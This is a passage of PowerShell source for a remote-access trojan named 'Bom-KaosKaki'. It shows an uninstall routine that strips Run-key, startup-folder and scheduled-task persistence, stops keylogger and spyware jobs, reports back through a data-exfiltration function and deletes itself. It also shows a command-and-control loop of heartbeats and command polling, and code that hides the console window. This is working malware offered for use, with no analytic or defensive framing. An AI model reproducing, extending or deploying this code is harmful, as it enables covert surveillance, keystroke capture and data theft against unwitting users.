        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Force -ErrorAction SilentlyContinue
    }
    catch {}
    
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue
    }
    catch {}
    
    try {
        Unregister-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Confirm:$false -ErrorAction SilentlyContinue
    }
    catch {}
    
    # Remove script files
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.bat" -Force -ErrorAction SilentlyContinue
    }
    catch {}
    
    # Stop keylogger and spyware
    Stop-Keylogger $cmd
    
    if ($Script:SpywareJob) {
        try { $Script:SpywareJob | Stop-Job -Force; $Script:SpywareJob | Remove-Job -Force } catch {}
        $Script:SpywareRunning = $false
    }
    
    Send-ExfilData -Type "uninstall" -Data @{ status = "uninstalled"; session_id = $Script:SessionId }
    
    # Schedule self-deletion
    $scriptPath = (Get-Process -Id $PID).Path
    $deleteScript = "Start-Sleep -Seconds 2; Remove-Item -Path '$scriptPath' -Force; Stop-Process -Id $PID -Force"
    Start-Job -ScriptBlock ([ScriptBlock]::Create($deleteScript))
    
    return "Uninstalling. Goodbye."
}

# ============ MAIN C2 LOOP ============

function Start-C2Communication {
    param([switch]$Force)
    
    $now = Get-Date
    
    # Send heartbeat if interval reached
    if ($Force -or (($now - $Script:LastHeartbeat).TotalSeconds -ge $HeartbeatInterval)) {
        Send-Heartbeat -Force
    }
    
    # Poll for commands if interval reached
    if ($Force -or (($now - $Script:LastCommandPoll).TotalSeconds -ge $PollInterval)) {
        $Script:LastCommandPoll = $now
        Invoke-CommandPoll
    }
}

# ============ INVOKE MAIN ============

function Invoke-Main {
    # Generate session ID if not set
    if (-not $Script:SessionId) {
        $Script:SessionId = Get-SessionId
        Write-Host "[+] Session ID: $Script:SessionId" -ForegroundColor Green
    }
    
    Write-Host "[+] Bom-KaosKaki Agent Started" -ForegroundColor Green
    Write-Host "[+] C2 Server: $C2Server" -ForegroundColor Cyan
    Write-Host "[+] Poll Interval: ${PollInterval}s | Heartbeat: ${HeartbeatInterval}s" -ForegroundColor Cyan
    
    # Send initial heartbeat
    Send-Heartbeat -Force
    
    # Main loop
    while ($true) {
        Start-C2Communication
        Start-Sleep -Seconds 5
    }
}

# ============ ENTRY POINT ============

# Hide window if running with -WindowStyle Hidden
try {
    $consoleHandle = (Get-Process -Id $PID).MainWindowHandle
    if ($consoleHandle -and $consoleHandle -ne 0) {
        $typeDef = @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@
        $showWindowAsync = Add-Type -MemberDefinition $typeDef -Name "Win32Show" -Namespace "Win32" -PassThru
        
        # SW_HIDE = 0
        $showWindowAsync::ShowWindowAsync($consoleHandle, 0) | Out-Null
    }
}
catch {}

# Start main
Invoke-Main